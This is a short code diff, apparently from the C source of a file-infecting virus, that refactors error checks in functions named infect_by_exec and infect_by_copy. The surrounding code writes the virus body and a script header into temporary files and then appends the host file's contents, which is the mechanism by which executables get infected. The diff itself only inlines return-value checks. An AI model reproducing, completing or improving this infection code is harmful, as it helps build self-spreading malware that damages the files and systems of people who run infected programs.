@@ -200,8 +200,7 @@ int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
         {(void *) script_header, sizeof(script_header) - 1},
         {link, length + 1}
     };
-    int remaining = writev_all(tmp_fd, iov, sizeof(iov));
-    if (remaining > 0) {
+    if (writev_all(tmp_fd, iov, sizeof(iov)) > 0) {
         result = errno;
         goto close_tmp;
     }
@@ -268,15 +267,13 @@ int infect_by_copy(const char *virus, const virus_info_t *info, const char *path
     }
     posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
 
-    size_t remaining = write_all(tmp_fd, virus, info->size);
-    if (remaining > 0) {
+    if (write_all(tmp_fd, virus, info->size) > 0) {
         result = errno;
         goto close_tmp;
     }
 
     posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
-    remaining = sendfile_all(tmp_fd, fd, stat.st_size);
-    if (remaining > 0) {
+    if (sendfile_all(tmp_fd, fd, stat.st_size) > 0) {
         result = errno;
         goto close_tmp;
     }
